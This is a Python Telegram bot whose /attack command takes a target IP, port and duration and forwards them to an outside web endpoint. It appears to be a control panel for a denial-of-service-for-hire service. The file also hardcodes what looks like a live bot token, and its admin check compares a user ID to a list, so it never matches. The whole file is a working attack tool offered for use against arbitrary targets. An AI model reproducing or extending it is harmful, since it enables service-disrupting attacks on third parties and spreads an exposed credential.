import json
import os
import requests
import asyncio
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

TELEGRAM_TOKEN = "7637579502:AAGAiIoxJVGOLvile_PBmVumIqmCZ8pUMIk"
ADMIN_ID = [1347675113]
BOT_OWNER = "@sher986"
APPROVED_USERS_FILE = "approved_users.json"

# --- Permanent Approved Users Storage ---
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, "r") as f:
            return json.load(f)
    else:
        return {}

def save_approved_users(users):
    with open(APPROVED_USERS_FILE, "w") as f:
        json.dump(users, f)

approved_users = load_approved_users()

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def is_approved(user_id: int) -> bool:
    return str(user_id) in approved_users

def approve_user(user_id: int):
    approved_users[str(user_id)] = True
    save_approved_users(approved_users)

def remove_user(user_id: int):
    if str(user_id) in approved_users:
        del approved_users[str(user_id)]
        save_approved_users(approved_users)

# Approve admin by default (once)
if not is_approved(ADMIN_ID):
    approve_user(ADMIN_ID)

attack_in_progress = False
attack_lock = asyncio.Lock()  # Non-blocking lock

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👋 Welcome to {BOT_OWNER}'s Bot!\n"
        "Use /attack, /approve, /remove commands."
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        target_id = int(context.args[0])
        approve_user(target_id)
        await update.message.reply_text(f"✅ User {target_id} is now approved to use the bot.")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid user ID (integer).")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to remove users.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    try:
        target_id = int(context.args[0])
        remove_user(target_id)
        await update.message.reply_text(f"🚫 User {target_id} has been removed and cannot use the bot.")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid user ID (integer).")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_in_progress
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command. Please contact admin.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time_in_seconds>")
        return

    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("⚠️ Invalid time. Please provide time in seconds as a positive integer.")
        return

    # Use lock to ensure only one attack at a time (asyncio safe)
    async with attack_lock:
        if attack_in_progress:
            await update.message.reply_text(
                "⚡️ Another attack is already in progress!\n"
                "🚫 Wait until it finishes before starting a new one!\n"
                "🔥 Only one attack at a time for maximum power! 🔥"
            )
            return
        attack_in_progress = True

    # Cool attack start message
    await update.message.reply_text(
        f"😎🚀 <b>Attack launched!</b>\n\n"
        f"🌐 Target: <code>{ip}:{port}</code>\n"
        f"⏱️ Duration: <b>{time_s} seconds</b>\n\n"
        f"<b>No one can start another attack until this one finishes!</b>\n"
        f"Get ready for the fireworks! 🎇",
        parse_mode='HTML'
    )

    url = "https://hingoli.io/soul/soul.php/s/"
    params = {'ip': ip, 'port': port, 'time': time_s}
    headers = {'User-Agent': 'TG-SOULCRACK'}

    try:
        response = requests.get(url, params=params, headers=headers, timeout=10)
        if response.status_code != 200:
            await update.message.reply_text(
                f"⚠️ Failed to start attack. Server responded with status code {response.status_code}."
            )
            # Reset progress flag if failed
            async with attack_lock:
                attack_in_progress = False
            return
    except requests.RequestException as e:
        await update.message.reply_text(f"⚠️ Network error: {e}")
        async with attack_lock:
            attack_in_progress = False
        return

    await asyncio.sleep(time_int)

    await update.message.reply_text(
        f"✅ <b>Attack on <code>{ip}:{port}</code> finished! 🎉🔥</b>",
        parse_mode='HTML'
    )
    # Reset attack flag
    async with attack_lock:
        attack_in_progress = False

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Stop command is not implemented.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_txt = "🟢 <b>No attack in progress. Ready for next strike!</b>" if not attack_in_progress else "🔴 <b>Attack in progress. Please wait!</b>"
    await update.message.reply_text(status_txt, parse_mode='HTML')

def main():
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.run_polling()

if __name__ == "__main__":
    main()